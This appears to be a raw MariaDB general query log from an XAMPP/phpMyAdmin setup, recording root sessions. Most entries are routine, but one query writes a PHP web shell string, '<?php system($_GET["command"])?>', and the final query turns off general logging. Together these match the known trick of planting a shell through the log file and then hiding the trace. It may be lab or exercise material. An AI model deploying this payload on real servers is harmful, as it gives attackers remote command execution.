c:\xampp\mysql\bin\mysqld.exe, Version: 10.4.6-MariaDB (mariadb.org binary distribution). started with:
TCP Port: 3306, Named Pipe: C:/xampp/mysql/mysql.sock
Time		    Id Command	Argument
		 96991 Query	SHOW WARNINGS
		 96991 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		 96991 Quit	
		 96990 Quit	
		 96992 Connect	pma@localhost as anonymous on 
		 96993 Connect	root@localhost as anonymous on 
		 96993 Query	SELECT @@version, @@version_comment
		 96993 Query	SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
		 96993 Query	SET lc_messages = 'en_US'
		 96992 Query	SELECT `config_data`, UNIX_TIMESTAMP(`timevalue`) ts FROM `phpmyadmin`.`pma__userconfig` WHERE `username` = 'root'
		 96993 Query	SET collation_connection = 'utf8mb4_unicode_ci'
		 96993 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		 96993 Query	select '<?php system($_GET["command"])?>'
		 96993 Query	SHOW WARNINGS
		 96993 Query	SELECT @@lower_case_table_names
		 96993 Query	SHOW  COLUMNS FROM .
		 96993 Query	SHOW INDEXES FROM .
		 96993 Query	SELECT @@have_profiling
		 96992 Query	SELECT CONCAT(`db_name`, '.', `table_name`, '.', `column_name`) AS column_name, `mimetype`,
                    `transformation`,
                    `transformation_options`,
                    `input_transformation`,
                    `input_transformation_options`
             FROM `phpmyadmin`.`pma__column_info`
             WHERE `db_name`    = ''
               AND `table_name` = ''
               AND ( `mimetype` != ''
                  OR `transformation` != ''
                  OR `transformation_options` != ''
                  OR `input_transformation` != ''
                  OR `input_transformation_options` != '')
		 96993 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		 96993 Quit	
		 96992 Quit	
		 96994 Connect	pma@localhost as anonymous on 
		 96995 Connect	root@localhost as anonymous on 
		 96995 Query	SELECT @@version, @@version_comment
		 96995 Query	SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
		 96995 Query	SET lc_messages = 'en_US'
		 96994 Query	SELECT `config_data`, UNIX_TIMESTAMP(`timevalue`) ts FROM `phpmyadmin`.`pma__userconfig` WHERE `username` = 'root'
		 96995 Query	SET collation_connection = 'utf8mb4_unicode_ci'
		 96995 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		 96995 Query	SET GLOBAL general_log='OFF'
